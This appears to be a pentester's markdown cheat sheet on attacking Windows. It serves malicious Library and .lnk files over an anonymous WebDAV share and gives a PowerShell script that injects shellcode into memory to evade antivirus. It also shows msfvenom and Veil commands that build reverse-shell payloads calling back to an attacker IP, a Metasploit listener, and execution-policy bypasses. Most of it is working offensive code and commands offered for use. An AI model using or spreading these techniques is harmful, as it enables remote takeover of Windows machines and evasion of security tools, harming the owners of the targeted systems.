# Microsoft Windows attacks

## WebDAV shares

To share malicious Library or .lnk files:
```
kali$ pip install wsgidav # or with apt-get
kali$ mkdir mywebdav # share visible on Windows Explorer
kali$ /path/to/wsgidav --host=0.0.0.0 --auth=anonymous --port $AttackerPort --root ./mywebdav
```

Library files: 
- https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry
- https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/config.Library-ms

Link `.lnk` files: https://learn.microsoft.com/en-us/windows/win32/shell/links 

## Anti-Virus evasion

Modern viruses:
- https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/
- https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf

### Powershell memory injection

Memory injection types:
- https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
- https://blog.f-secure.com/memory-injection-like-a-boss/

#### Script

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc =
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = someshellcode;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Shell code:
```
kali$ msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f powershell -v sc
```

#### Execution policy

See ByPass: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3

##### At system level

```
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

##### At script level

```
PS> powershell -ep bypass ./somescript.ps1
```

### Shellter

Project: https://www.shellterproject.com/

Metasploit listener:
```
kali$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $AttackerIP;set LPORT $AttackerPort;run;"
```

### Veil

Install:
```
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

Issue: https://github.com/Veil-Framework/Veil/issues/428
```
sudo -u "${trueuser}" WINEPREFIX="${winedir}" wine "${winedir}/drive_c/Python34/python.exe" "-m" "pip" "install" "-Iv" "pefile==2019.4.18"
```

Usage:
```
kali$ veil -e Evasion -p powershell/meterpreter/rev_tcp --msfpayload windows/meterpreter/reverse_tcp --msfoptions LHOST=$AttackerIp LPORT=$AttackerPort
```

